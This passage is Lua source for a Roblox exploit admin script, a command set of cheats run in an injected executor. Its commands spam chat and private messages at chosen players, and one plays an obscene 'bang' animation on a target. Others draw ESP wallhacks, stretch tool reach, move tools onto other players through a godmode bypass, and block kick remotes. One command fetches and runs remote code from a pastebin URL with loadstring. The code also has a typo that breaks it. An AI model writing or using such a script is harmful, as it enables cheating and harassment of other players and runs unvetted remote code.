				Notification("warning", "This command disables all remotes incase they are kick remotes, may break game.", 8)
				Notification("info", "Does not prevent serverside kicks, use "..commandPrefix.."antikick off to turn off.", 8)
			elseif args[1] == "off" then
				antiremotes = false
				Notification("warning", "Remote anti-kick turned off.", 8)
			end
		end
	end

	blockedremotes = {}
	Commands.blockremote = function(args)
		local getService = ""
		if args[1] then
			local remoteName = string.lower(tostring(args[1]))
			if args[2] then
				local serviceRemote = string.lower(tostring(args[2]))
				if serviceRemote == "workspace" then
					getService = "Workspace"
				elseif serviceRemote == "replicatedstorage" then
					getService = "ReplicatedStorage"
				elseif serviceRemote == "players" then
					getService = "Players"
				elseif serviceRemote == "lighting" then
					getService = "Lighting"
				elseif serviceRemote == "startergui" then
					getService = "StarterGui"
				elseif serviceRemote == "starterpack" then
					getService = "StarterPack"
				elseif serviceRemote == "starterplayer" then
					getService = "StarterPlayer"
				else
					getService = "ReplicatedStorage"
				end
			else
				getService = "ReplicatedStorage"
			end
			for i,getRemote in pairs(game:GetService(getService):GetDescendants()) do
				if string.lower(getRemote.Name) == remoteName then
					table.insert(blockedremotes, getRemote.Name)
				end
			end
		end
		Notification("warning", "If this command does not work, make sure you type remote name/service fully correct.", 8)
	end

	spyingremotes = false
	Commands.remotespy = function(args)
		if args[1] then
			if args[1] == "on" then
				spyingremotes = true
				Notification("info", "Remotespy turned on.", 4)
			elseif args[1] == "off" then
				spyingremotes = false
				Notification("info", "Remotespy turned off.", 4)
			end
		end
	end

	Commands.bang = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				if v ~= nil then
					following = true
					flwplr = v
					flwnum = -1
					local bangAnimation = Instance.new("Animation")
					bangAnimation.AnimationId = "rbxassetid://148840371"
					bangTrack = LP.Character.Humanoid:LoadAnimation(bangAnimation)
					if args[2] then
						bangTrack:Play(.1, 1, args[2])
					else
						bangTrack:Play(.1, 1, 1)
					end
				end
			end
		else
			Notification("warning", "No player selected to follow! Use: "..commandPrefix.."follow player", 4)
		end
	end

	Commands.unbang = function(args)
		following = false
		bangTrack:Stop()
	end

	spamdelay = 1
	spamtext = "Spam"
	spamming = false
	Commands.spam = function(args)
		if args[1] then
			spamtext = args[1]
			spamming = true
		end
	end
	Commands.spamdelay = function(args)
		if args[1] then
			spamdelay = args[1]
		end
	end
	spawn(function()
		while wait(spamdelay) do
			if spamming then
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamtext, "All")
			end
		end
	end)

	Commands.unspam = function(args)
		spamming = false
	end

	Commands.info = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				createINFO(v)
			end
		end
	end

	Commands.age = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." Account Age: "..v.AccountAge.." days!", "All")
			end
		end
	end

	Commands.invisible = function(args)
		local Character = LP.Character
		if LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
			local Clone = Character.HumanoidRootPart:Clone()
			Character.HumanoidRootPart:Destroy()
			Clone.Parent = Character
		else
			local Clone = Character.LowerTorso.Root:Clone()
			Character.LowerTorso.Root:Destroy()
			Clone.Parent = Character.LowerTorso
		end
	end

	walkto = false
	walkplr = ""
	Commands.walk = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				walkplr = v
				walkto = true
				noclip = true
			end
		end
	end

	Commands.unwalk = function(args)
		walkto = false
		noclip = false
		LP.Character.Humanoid:MoveTo(LP.Character.HumanoidRootPart.Position)
	end

	Commands.glitch = function(args)
		if hasTools() == false then
			Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
		else
			FEGodmode()
			for i,v in pairs(LP.Backpack:GetChildren())do
				LP.Character.Humanoid:EquipTool(v)
			end
			if args[1] then
				for i,v in pairs(findSinglePlayer(args[1])) do
					local function tp(player,player2)
						local char1,char2=player.Character,player2.Character
						if char1 and char2 then
							char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
						end
					end
					tp(game:GetService("Players")[v.Name], LP)
					wait(0.2)
					tp(game:GetService("Players")[v.Name], LP)
					wait(0.5)
					local b = Instance.new("BodyForce")
					b.Parent = LP.Character.HumanoidRootPart
					b.Name = "Glitch"
					if args[2] then
						b.Force = Vector3.new(args[2],5000,0)
					else
						b.Force = Vector3.new(100000000,5000,0)
					end
					wait(6)
					b:Destroy()
				end
			end
		end
	end

	Commands.tp = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				if v == LP then
					if args[2] then
						for i,a in pairs(findSinglePlayer(args[2])) do
							v.Character.HumanoidRootPart.CFrame = a.Character.HumanoidRootPart.CFrame
						end
					end
				else
					if hasTools() == false then
						Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
					else
						FEGodmode()
						for i,v in pairs(LP.Backpack:GetChildren())do
							LP.Character.Humanoid:EquipTool(v)
						end
						if args[1] then
							for i,first in pairs(findSinglePlayer(args[1])) do
								if args[2] then
									for i,second in pairs(findSinglePlayer(args[2])) do
										local function tp(player,player2)
											local char1,char2=player.Character,player2.Character
											if char1 and char2 then
												char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
											end
										end
										local function getout(player,player2)
											local char1,char2=player.Character,player2.Character
											if char1 and char2 then
												char1:MoveTo(char2.Head.Position)
											end
										end
										tp(LP, first)
										wait(0.2)
										tp(LP, first)
										wait(0.5)
										tp(LP, second)
										wait(0.2)
										tp(LP, second)
										wait(0.2)
										getout(LP, first)
									end
								end
							end
						end
					end
				end
			end
		end
	end

	Commands.givetool = function(args)
		if args[1] then
			if args[2] then
				local selectedTool = ""
				for i,allTools in pairs(LP.Character:GetDescendants()) do
					if allTools:IsA("Tool") and string.lower(allTools.Name) == string.lower(args[2]) then
						selectedTool = allTools
					else
						for i,otherTools in pairs(LP.Backpack:GetDescendants()) do
							if otherTools:IsA("Tool") and string.lower(otherTools.Name) == string.lower(args[2]) then
								selectedTool = otherTools
							end
						end
					end
				end
				for i,v in pairs(findSinglePlayer(args[1])) do
					if selectedTool ~= "" then
						selectedTool.Parent = v.Character
					end
				end
			else
				for i,plr in pairs(findSinglePlayer(args[1])) do
					for i,tool in pairs(LP.Character:GetDescendants()) do
						if tool:IsA("Tool") then
							tool.Parent = plr.Character
						end
					end
				end
			end
		end
	end

	Commands.givealltools = function(args)
		LP.Character.Humanoid:UnequipTools()
		for i,plr in pairs(findSinglePlayer(args[1])) do
			for i,v in pairs(LP.Character:GetDescendants()) do
				if v:IsA("Tool") then
					v.Parent = plr.Character
				end
			end
			for i,a in pairs(LP.Backpack:GetDescendants()) do
				if a:IsA("Tool") then
					a.Parent = plr.Character
				end
			end
		end
	end

	Commands.blockhats = function(args)
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Accessory") or v:IsA("Hat") then
				for i,mesh in pairs(v:GetDescendants()) do
					if mesh.Name == "Mesh" then
						mesh:Destroy()
					end
				end
			end
		end
	end

	Commands.blocktool = function(args)
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Tool") then
				for i,mesh in pairs(v:GetDescendants()) do
					if mesh.Name == "Mesh" then
						mesh:Destroy()
					end
				end
			end
		end
	end

	Commands.orbit = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				view(v)
				RocketPropulsion(5000,100,5000,v,"OrbitMove")
			end
		else
			Notification("warning", "No player selected to orbit! Use: "..commandPrefix.."orbit player", 4)
		end
	end

	Commands.unorbit = function(args)
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v.Name == "OrbitMove" then
				v:Destroy()
			end
		end
		view(LP)
	end

	Commands.pos = function(args)
		Notification("info", "Your current position is ".. tostring(LP.Character.HumanoidRootPart.Position), 9)
	end

	SavedPosition = ""
	Commands.savepos = function(args)
		SavedPosition = LP.Character.HumanoidRootPart.CFrame
	end
	Commands.loadpos = function(args)
		if SavedPosition ~= "" then
			LP.Character.HumanoidRootPart.CFrame = SavedPosition
		end
	end

	Commands.tppos = function(args)
		if args[1] and args[2] and args[3] then
			LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(args[1], args[2], args[3]))
		end
	end

	Commands.pmspam = function(args)
		if args[1] then
			local gotPlayer = ""
			for i,v in pairs(findPlayer(args[1])) do
				gotPlayer = v
			end
			table.remove(args, 1)
			local pmSpamMsg = table.concat(args," ")
			spamtext = "/w "..gotPlayer.Name.." "..pmSpamMsg
			spamming = true
		end
	end

	Commands.unpmspam = function(args)
		spamming = false
	end

	Commands.wsvis = function(args)
		if args[1] then
			for i,v in pairs(gsWorkspace:GetDescendants()) do
				if v:IsA("Part") or v:IsA("Decal") then
					if tonumber(args[1]) > 1 then
						v.Transparency = 0.5
					else
						v.Transparency = args[1]
					end
				end
			end
		end
		clientSided()
	end

	Commands.bringobj = function(args)
		if args[1] then
			local Object = ""
			for i,v in pairs(gsWorkspace:GetDescendants()) do
				if string.lower(v.Name) == string.lower(args[1]) then
					Object = v				
				end
			end
			if Object == "" then
				Notification("warning", "Object was not found in the workspace.", 6)
			end
			if args[2] then
				Object.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * args[2]
			else
				Object.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 3
			end
			clientSided()
		end
	end

	CBRINGplr = ""
	cbringing = false
	cbringingall = false
	Commands.cbring = function(args)
		if args[1] then
			if string.lower(tostring(args[1])) == "all" or string.lower(tostring(args[1])) == "others" then
				cbringingall = true
			else
				for i,v in pairs(findPlayer(args[1])) do
					CBRINGplr = v
					cbringing = true
				end
			end
			if args[2] then
				CBRINGamount = args[2]
			else
				CBRINGamount = 3
			end
			clientSided()
		end
	end

	Commands.uncbring = function(args)
		cbringing = false
		cbringingall = false
	end

	Commands.cfreeze = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
				v.Character.HumanoidRootPart.Anchored = true
			end
			clientSided()
		end
	end

	Commands.uncfreeze = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
				v.Character.HumanoidRootPart.Anchored = false
			end
		else
			for i,all in pairs(gsPlayers:GetPlayers()) do
				all.Character.HumanoidRootPart.Anchored = false
			end
		end
	end

	Commands.unattach = function(args)
		local function getout(player,player2)
			local char1,char2=player.Character,player2.Character
			if char1 and char2 then
				char1:MoveTo(char2.Head.Position)
			end
		end
		getout(LP, LP)
	end

	currentToolSize = ""
	Commands.reach = function(args)
		if args[1] then
			for i,v in pairs(LP.Character:GetDescendants()) do
				if v:IsA("Tool") then
					if string.lower(tostring(args[1])) == "off" then
						v.Handle.Size = currentToolSize
						v.Handle.SelectionBoxCreated:Destroy()
						LP.Character.Humanoid:UnequipTools()
					elseif string.lower(tostring(args[1])) == "on" then
						if args[2] then
							currentToolSize = v.Handle.Size
							local a = Instance.new("SelectionBox",v.Handle)
							a.Name = "SelectionBoxCreated"
							a.Adornee = v.Handle
							v.Handle.Size = Vector3.new(0.5,0.5,args[2])
							v.GripPos = Vector3.new(0,0,0)
							LP.Character.Humanoid:UnequipTools()
						else
							currentToolSize = v.Handle.Size
							local a = Instance.new("SelectionBox",v.Handle)
							a.Name = "SelectionBoxCreated"
							a.Adornee = v.Handle
							v.Handle.Size = Vector3.new(0.5,0.5,60)
							v.GripPos = Vector3.new(0,0,0)
							LP.Character.Humanoid:UnequipTools()
						end
					end
				end
			end
		end
	end

	Commands.droptool = function(args)
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Parent = gsWorkspace
			end
		end
		for i,a in pairs(LP.Backpack:GetDescendants()) do
			if a:IsA("Tool") then
				a.Parent = gsWorkspace
			end
		end
	end

	Commands.drophats = function(args)
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Accessory") or v:IsA("Hat") then
				v.Parent = gsWorkspace
			end
		end
	end

	Commands.hidecmdbar = function(args)
		CMDBAR.Visible = false
	end

	Commands.showcmdbar = function(args)
		CMDBAR.Visible = true
	end

	Commands.prefix = function(args)
		if args[1] then
			commandPrefix = string.sub(tostring(args[1]), 1, 1)
			fullUpdate()
		end
	end

	Commands.removeinvis = function(args)
		for i,v in pairs(gsWorkspace:GetDescendants()) do
			if v:IsA("Part") and v.Name ~= "HumanoidRootPart" then
				if v.Transparency == 1 then
					v:Destroy()
				end
			end
		end
		clientSided()
	end

	Commands.removefog = function(args)
		gsLighting.FogStart = 0
		gsLighting.FogEnd = 9999999999999
		clientSided()
	end

	Commands.animation = function(args)
		if args[1] then
			if string.lower(tostring(args[1])) == "gui" then
				loadstring(game:HttpGet(("https://pastebin.com/raw/mdbTSP4d"),true))()
			else
				local Anim = Instance.new("Animation")
				Anim.AnimationId = "rbxassetid://".. tostring(args[1])
				local track = LP.Character.Humanoid:LoadAnimation(Anim)
				if args[2] then
					track:Play(.1, 1, args[2])
				else
					track:Play(.1, 1, 1)
				end
			end
		end
	end

	Commands.btools = function(args)
		local Clone_T = Instance.new("HopperBin",LP.Backpack)
		Clone_T.BinType = "Clone"
		local Destruct = Instance.new("HopperBin",LP.Backpack)
		Destruct.BinType = "Hammer"
		local Hold_T = Instance.new("HopperBin",LP.Backpack)
		Hold_T.BinType = "Grab"
		clientSided()
	end

	Commands.esp = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
				local espPlayer = v
				for i,createESP in pairs(espPlayer.Character:GetDescendants()) do
					if createESP:IsA("Part") or createESP:IsA("MeshPart") then
						if createESP.Name ~= "HumanoidRootPart" and createESP.Name ~= "Handle" then
							local current = true
							local espBOX = Instance.new("BoxHandleAdornment")
							espBOX.Parent = game.Players.LocalPlayer.PlayerGui
							espBOX.Name = "rGET"..espPlayer.Name
							espBOX.Adornee = createESP
							espBOX.AlwaysOnTop = true
							espBOX.ZIndex = 0
							espBOX.Size = createESP.Size
							espBOX.Transparency = 0.3
							local AboveHead = Instance.new("BillboardGui")
							AboveHead.Parent = game.Players.LocalPlayer.PlayerGui
							AboveHead.Adornee = espPlayer.Character.Head
							AboveHead.Name = "rGET"..espPlayer.Name
							AboveHead.Size = UDim2.new(0, 100, 0, 100)
							AboveHead.StudsOffset = Vector3.new(0, 1, 0)
							AboveHead.AlwaysOnTop = true
							local Info = Instance.new("TextLabel")
							Info.Parent = AboveHead
							Info.BackgroundTransparency = 1
							Info.Position = UDim2.new(0, 0, 0, 0)
							Info.Size = UDim2.new(1, 0, 0, 40)
							Info.TextColor3 = Color3.fromRGB(200,200,200)
							Info.TextStrokeTransparency = 0.5
							Info.TextSize = 15
							if espPlayer.TeamColor == LP.TeamColor then
								espBOX.Color = BrickColor.new("Lime green")
								Info.TextStrokeColor3 = Color3.fromRGB(10,100,10)
							else
								espBOX.Color = BrickColor.new("Really red")
								Info.TextStrokeColor3 = Color3.fromRGB(100,10,10)
							end
							game:GetService('RunService').Stepped:connect(function()
								if current and LP.Character.Humanoid and espPlayer.Character.HumanoidRootPart then
									Info.Text = espPlayer.Name.." (".. math.floor((LP.Character.HumanoidRootPart.Position - espPlayer.Character.HumanoidRootPart.Position).magnitude)..")"
								end
							end)
							espPlayer.Character.Humanoid.Died:Connect(function()
								current = false
								espBOX:Destroy()
								AboveHead:Destroy()
							end)
							gsPlayers.PlayerRemoving:Connect(function(plr)
								if plr == espPlayer then
									current = false
									espBOX:Destroy()
									AboveHead:Destroy()
								end
							end)
						end
					end
				end
			end
			clientSided()
		end
	end

	Commands.unesp = function(args)
		if not args[1] then
			for i,v in pairs(gsCoreGui:GetDescendants()) do
				if string.sub(v.Name, 1, 4) == "rGET" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(gsCoreGui:GetDescendants()) do
				if string.sub(v.Name, 1, 4) == "rGET" then
					for i,a in pairs(findPlayer(args[1])) do
						if string.sub(v.Name, 5) == a.Name then
							v:Destroy()
						end
					end
				end
			end
		end
	end

	Commands.dice = function(args)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You rolled a dice for ".. tostring(math.random(1, 6)), "All")
	end

	Commands.random = function(args)
		if args[1] and args[2] then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Picking random number between "..args[1].." and "..args[2].."... The number is ".. tostring(math.random(args[1], args[2])), "All")
		end
	end

	Commands.closegame = function(args)
		game:Shutdown()
	end

	Commands.savetool = function(args)
		if args[1] then
			for i,a in pairs(LP.Character:GetDescendants()) do
				if a:IsA("Tool") and string.lower(a.Name) == string.lower(tostring(args[1])) then
					a.Parent = LP
					local oldName = a.Name
					a.Name = "saved "..oldName
				else
					for i,n in pairs(LP.Backpack:GetDescendants()) do
						if n:IsA("Tool") and string.lower(n.Name) == string.lower(tostring(args[1])) then
							n.Parent = LP
							local sOldName = n.Name
							n.Name = "saved "..sOldName
						end
					end
				end
			end
		else
			for i,v in pairs(LP.Character:GetDescendants()) do
				if v:IsA("Tool") then
					v.Parent = LP
					local oldName = v.Name
					v.Name = "saved "..oldName
				end
			end
		end
	end

	Commands.loadtool = function(args)
		if args[1] then
			for i,a in pairs(LP:GetChildren()) do
				if a:IsA("Tool") and string.sub(a.Name, 1, 5) == "saved" and string.lower(string.sub(a.Name, 7)) == string.lower(tostring(args[1])) then
					a.Parent = LP.Backpack
					local currentName = a.Name
					a.Name = string.sub(currentName, 7)
				end
			end
		else
			for i,v in pairs(LP:GetChildren()) do
				if string.sub(v.Name, 1, 5) == "saved" then
					v.Parent =F LP.Backpack
					local currentName = v.Name
					v.Name = string.sub(currentName, 7)
				end
			end
		end
	end

	Commands.savealltool = function(args)
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Parent = LP
				local oldName = v.Name
				v.Name = "saved "..oldName
			end
		end
		for i,v in pairs(LP.Backpack:GetDescendants()) do
			if v:IsA("Tool") then
				v.Parent = LP
				local oldName = v.Name
				v.Name = "saved "..oldName
			end
		end
	end

	Commands.loadalltool = function(args)
		for i,v in pairs(LP:GetChildren()) do
			if v:IsA("Tool") and string.sub(v.Name, 1, 5) == "saved" then
				v.Parent = LP.Backpack
				local currentName = v.Name
				v.Name = string.sub(currentName, 7)
			end
		end
	end

	Mouse.KeyDown:Connect(function(key) 
		if key == clicktpKEY and clicktpACTIVE == true then 
			if Mouse.Target then 
				LP.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.x, Mouse.Hit.y + 5, Mouse.Hit.z)
			end 
		end
		if key == clickdelKEY and clickdelACTIVE == true then 
			if Mouse.Target then 
				Mouse.Target:Destroy()
			end 
		end
	end)
	Mouse.Button1Down:Connect(function()
		if clicktpACTIVE == true and clicktpCLICK == true then
			if Mouse.Target then 
				LP.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.x, Mouse.Hit.y + 5, Mouse.Hit.z)
			end 
		end
		if clickdelACTIVE == true and clickdelCLICK == true then
			if Mouse.Target then
				Mouse.Target:Destroy()
			end
		end
	end)

	clicktpKEY = ""
	clickdelKEY = ""
	clicktpACTIVE = false
	clickdelACTIVE = false
	clicktpCLICK = false
	clickdelCLICK = false

	Commands.clicktp = function(args)
		if args[1] then
			clicktpKEY = string.sub(tostring(args[1]), 1, 1)
			clicktpACTIVE = true
			clicktpCLICK = false
		else
			clicktpKEY = ""
			clicktpACTIVE = true
			clicktpCLICK = true
		end
		clientSided()
	end

	Commands.clickdel = function(args)
		if args[1] then
			clickdelKEY = string.sub(tostring(args[1]), 1, 1)
			clickdelACTIVE = true
			clickdelCLICK = false
		else
			clickdelKEY = ""
			clickdelACTIVE = true
			clickdelCLICK = true
		end
		clientSided()
	end

	Commands.unclicktp = function(args)
		clicktpACTIVE = false
	end

	Commands.unclickdel = function(args)
		clickdelACTIVE = false
	end

	Commands.oof = function(args)
		spawn(function()
			while wait() do
				for i,v in pairs(game:GetService'Players':GetPlayers()) do
					if v.Character ~= nil and v.Character:FindFirstChild'Head' then
						for _,x in pairs(v.Character.Head:GetChildren()) do
							if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true) end
						end
					end
				end
			end
		end)
	end

	Commands.chatlogs = function(args)
		MainChatFrame.Position = UDim2.new(0, 760, 0, 261)
		MainChatFrame.Visible = true
	end

	Commands.stopadmin = function(args)
		commandPrefix = "     "
		following = false
		trailing = false
		annoying = false
		CMDBAR.Visible = false
		Match.Visible = false
		flying = false
	end

	Commands.freecam = function(args)
		for i,getFC in pairs(gsWorkspace:GetDescendants()) do
			if getFC.Name == "rGETpartNUMBER2" then
				getFC:Destroy()
			end
		end
		local CameraPart = Instance.new("Part")
		CameraPart.CanCollide = false
		CameraPart.CFrame = LP.Character.Head.CFrame
		CameraPart.Locked = true
		CameraPart.Transparency = 1
		CameraPart.Size = Vector3.new(1, 1, 1)
		CameraPart.Parent = gsWorkspace
		CameraPart.Name = "rGETpartNUMBER2"
		if bypassMODE == true then
			loopviewfc = true
		elseif bypassMODE == false then
			gsWorkspace.CurrentCamera.CameraSubject = CameraPart
		end
		local speedget = 1
		local T = CameraPart
		local CONTROL = {F = 0, B = 0, L = 0, R = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
		local SPEED = speedget
		if args[1] then
			speedfly = tonumber(args[1])
		else
			speedfly = 1
		end
		local function freecamfly()
			LP.Character.Head.Anchored = true
			doFREECAM = true
			local BG = Instance.new('BodyGyro', T)
			local BV = Instance.new('BodyVelocity', T)
			BG.P = 9e4
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0.1, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
			spawn(function()
				repeat wait()
					if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
						SPEED = 50
					elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
						SPEED = 0
					end
					if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
					elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					else
						BV.velocity = Vector3.new(0, 0.1, 0)
					end
					BG.cframe = workspace.CurrentCamera.CoordinateFrame
				until not doFREECAM
				CONTROL = {F = 0, B = 0, L = 0, R = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0}
				SPEED = 0
				BG:destroy()
				BV:destroy()
			end)
		end
		Mouse.KeyDown:connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = speedfly
			elseif KEY:lower() == 's' then
				CONTROL.B = -speedfly
			elseif KEY:lower() == 'a' then
				CONTROL.L = -speedfly 
			elseif KEY:lower() == 'd' then 
				CONTROL.R = speedfly
			end
		end)
		Mouse.KeyUp:connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = 0
			elseif KEY:lower() == 's' then
				CONTROL.B = 0
			elseif KEY:lower() == 'a' then
				CONTROL.L = 0
			elseif KEY:lower() == 'd' then
				CONTROL.R = 0
			end
		end)
		freecamfly()
	end

	Commands.fc = function(args)
		if args[1] then
			run(commandPrefix.."freecam "..args[1])
		else
			run(commandPrefix.."freecam")
		end
	end

	Commands.unfreecam = function(args)
		doFREECAM = false
		LP.Character.Head.Anchored = false
		view(LP)
		if gsWorkspace.rGETpartNUMBER2 then
			gsWorkspace.rGETpartNUMBER2:Destroy()
		end
		loopviewfc = false
	end

	Commands.unfc = function(args)
		doFREECAM = false
		LP.Character.Head.Anchored = false
		view(LP)
		if gsWorkspace.rGETpartNUMBER2 then
			gsWorkspace.rGETpartNUMBER2:Destroy()
		end
		loopviewfc = false
	end

	Commands.gotofc = function(args)
		doFREECAM = false
		LP.Character.Head.Anchored = false
		view(LP)
		pcall(function()
			LP.Character.HumanoidRootPart.CFrame = gsWorkspace.rGETpartNUMBER2.CFrame
			gsWorkspace.rGETpartNUMBER2:Destroy()
		end)
		loopviewfc = false
	end

	Commands.fctp = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
				pcall(function()
					gsWorkspace.rGETpartNUMBER2.CFrame = v.Character.Head.CFrame
				end)
			end
		end
	end

	Commands.cmds = function(args)
		CMDSmain.Position = UDim2.new(0, 695, 0, 297)
		CMDSmain.Visible = true
		CMDSmain:TweenSize(UDim2.new(0, 440, 0, 367), "InOut", "Sine", 1)
	end

	Commands.fullcredits = function(args)
		Notification("info", "Credit to Autumn, Josh and 3dsboy08 (Help with "..commandPrefix.."remotespy and anti client kick)", 1)
		Notification("info", "Credit to Infinite Yield developers (Assisted in "..commandPrefix.."esp and "..commandPrefix.."fly commands)", 1)
		Notification("info", "Credit to Timeless ("..commandPrefix.."invisible) and Harkinian ("..commandPrefix.."shutdown)", 1)
		Notification("info", "Credit to DEX creators ("..commandPrefix.."explorer) and xFunnieuss ("..commandPrefix.."spinhats)", 1)
		Notification("info", "Only creator is illremember", 2)
	end

	Commands.hotkey = function(args)
		if args[1] then
			local hotkeyKEY = string.sub(tostring(args[1]), 1, 3)
			if args[2] then
				table.remove(args, 1)
				local hotkeyCMD = table.concat(args, " ")
				table.insert(hotkeys, hotkeyCMD.."//"..hotkeyKEY)
				fullUpdate()
				Notification("info", "Hotkey added!", 1)
			end
		end
	end

	Mouse.KeyDown:Connect(function(key)
		for i,v in pairs(hotkeys) do
			local currentKey = string.match(v, "[%a%d]+$")
			if string.len(currentKey) == 1 then
				if key == string.sub(v, #v, #v) then
					local commandtoRUN = string.match(v, "^[%w%s]+")
					if string.sub(string.lower(tostring(commandtoRUN)), 1, 3) == "fly" then
						if bypassMODE == true then
							if doFREECAM == false then
								run(commandPrefix..tostring(commandtoRUN))
							else
								run(commandPrefix.."unfly")
							end
						else
							if flying == false then
								run(commandPrefix..tostring(commandtoRUN))
							else
								run(commandPrefix.."unfly")
							end
						end
					elseif tostring(commandtoRUN) == "noclip" then
						if noclip == false then
							run(commandPrefix..tostring(commandtoRUN))
						else
							run(commandPrefix.."clip")
						end
					elseif tostring(commandtoRUN) == "freecam" or tostring(commandtoRUN) == "fc" then
						if doFREECAM == false then
							run(commandPrefix..tostring(commandtoRUN))
						else
							if fchotkeymode == "goto" then
								run(commandPrefix.."gotofc")
							elseif fchotkeymode == "unfc" then
								run(commandPrefix.."unfreecam")
							end
						end
					else
						run(commandPrefix..tostring(commandtoRUN))
					end
				end
			else
				if string.lower(string.sub(tostring(currentKey), 1, 1)) == "f" then
					local commandtoRUN = string.match(v, "^[%w%s]+")
					local hotkeyadjust = tonumber(string.sub(currentKey, 2, 3)) + 25
					if string.byte(key) == hotkeyadjust then
						if string.sub(string.lower(tostring(commandtoRUN)), 1, 3) == "fly" then
							if bypassMODE == true then
								if doFREECAM == false then
									run(commandPrefix..tostring(commandtoRUN))
								else
									run(commandPrefix.."unfly")
								end
							else
								if flying == false then
									run(commandPrefix..tostring(commandtoRUN))
								else
									run(commandPrefix.."unfly")
								end
							end
						elseif tostring(commandtoRUN) == "noclip" then
							if noclip == false then
								run(commandPrefix..tostring(commandtoRUN))
							else
								run(commandPrefix.."clip")
							end
						elseif tostring(commandtoRUN) == "freecam" or tostring(commandtoRUN) == "fc" then
							if doFREECAM == false then
								run(commandPrefix..tostring(commandtoRUN))
							else
								if fchotkeymode == "goto" then
									run(commandPrefix.."gotofc")
								elseif fchotkeymode == "unfc" then
									run(commandPrefix.."unfreecam")
								end
							end
						else
							run(commandPrefix..tostring(commandtoRUN))
						end
					end
				end
			end
		end
	end)

	Commands.removeallhotkey = function(args)
		hotkeys = {}
		fullUpdate()
		Notification("warning", "All hotkeys reset/removed", 6)
	end

	Commands.removehotkey = function(args)
		if args[1] then
			for i,v in pairs(hotkeys) do
				local currentKey = string.match(v, "[%a%d]+$")
				if currentKey == string.lower(tostring(args[1])) then
					table.remove(hotkeys, i)
					fullUpdate()
				end
			end
		end
	end

	Commands.printhotkeys = function(args)
		for i,v in pairs(hotkeys) do
			warn("HOTKEYS:")
			print(v)
		end
	end

	Commands.os = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
